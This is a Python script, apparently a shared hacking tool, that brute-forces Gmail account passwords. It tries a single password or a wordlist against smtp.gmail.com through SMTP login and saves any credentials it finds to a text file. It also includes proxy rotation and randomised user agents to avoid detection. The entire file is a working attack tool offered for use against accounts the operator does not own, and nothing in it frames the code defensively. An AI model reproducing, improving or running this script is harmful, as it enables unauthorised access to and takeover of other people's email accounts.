#!/usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import threading
from optparse import *
import time
try :
    from proxylist import ProxyList
except:
    print("pip3 install proxylist ")
try :
    from mechanize import Browser
except:
    print("pip3 install mechanize")
from os import *
import sys
import logging
import io
import random
try:
    import cookielib
except:
    import http.cookiejar as cookielib
try:
    import mechanize
except:
    print("pip3 install mechanize ")
R = '\033[31m'  # red
G = '\033[32m'  # green
W = '\033[0m' # white (normal)
use = OptionParser("""{}
_____________________                              _____________________
`-._:  .:'   `:::  .:\           |\__/|           /::  .:'   `:::  .:.-'
    \      :          \          |:   |          /         :       /    
     \     ::    .     `-_______/ ::   \_______-'   .      ::   . /      
      |  :   :: ::'  :   :: ::'  :   :: ::'      :: ::'  :   :: :|       
      |     ;::         ;::         ;::         ;::         ;::  |       
      |  .:'   `:::  .:'   `:::  .:'Ksa`:::  .:'   `:::  .:'   `:|       
      /     :           :           :           :           :    \       
     /______::_____     ::    .     ::    .     ::   _____._::____\      
                   `----._:: ::'  :   :: ::'  _.----'                    
                          `--.       ;::  .--'                           
                              `-. .:'  .-'                               
                                 \    / https://github.com/Matrix07ksa/                                        
                               Hejab_Zaeri
                                  \  /                                   
                                   \/ 
{}
-----------------------------------------------------------------------
-g --gmail                              ACCOUNT gmail @gmail.com
-l --list                               List    Password BrutoForce
-p --password                           Single  Password
-X --proxy                              Proxy list
                            
							   """.format(G,R))

use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
(options,args) = use.parse_args()

brows = Browser()
brows.set_handle_robots(False)
brows._factory.is_html = True
brows.set_cookiejar(cookielib.LWPCookieJar())
useragents = [
           'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6']
brows.addheaders = [('User-agent',random.choice(useragents))]
brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
proxyList = options.proxy
#Coding Function Proxy 0xAbdullah
def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('[!] Proxy File format has incorrect | EXIT...')
    pl.random()
    getProxy = pl.random().address()
    brows.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
    except:
        return proxy()


if options.gmail == None  :
    
                    print(use.usage)
                    exit()       
    

elif options.gmail !=None or  options.gmail== None or options.gmail==None:  
    smtp_srverG= smtplib.SMTP('smtp.gmail.com', 587)
    smtp_srverG.ehlo()
    smtp_srverG.starttls()
    if options.password != None or options.list_password == None  :
        print("%s<<<<<<+++++Comece a atacar o Gmail+++++>>>>>%s"%(R,W))
        try :    
            smtp_srverG.login(options.gmail,options.password)
            print("sua senha foi encontrada com sucesso :{} \t Gmail encontrado:{}".format(options.password,options.gmail))
            Save = io.open("gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
        except :
            print("Senha não encontrada : {} \t Gmail:{}".format(options.password,options.gmail))
    elif options.list_password !=None:
        password_list = io.open(options.list_password,"r").readlines()
        for password in password_list:
            password = password.rstrip("\n")
            print("%s<<<<<<+++++Comece a atacar o Gmail+++++>>>>>%s"%(R,W))
            try :    
                smtp_srverG.login(options.gmail,password)
                print("{}<<<+++sua senha foi encontrada com sucesso  :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tsenha:"+password+"\n")
                break
            except smtplib.SMTPAuthenticationError:
                print("{}<<<---Senha não encontrada : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       

else:
    print(use.usage)
    exit()  
############################################################THE END####################################################################
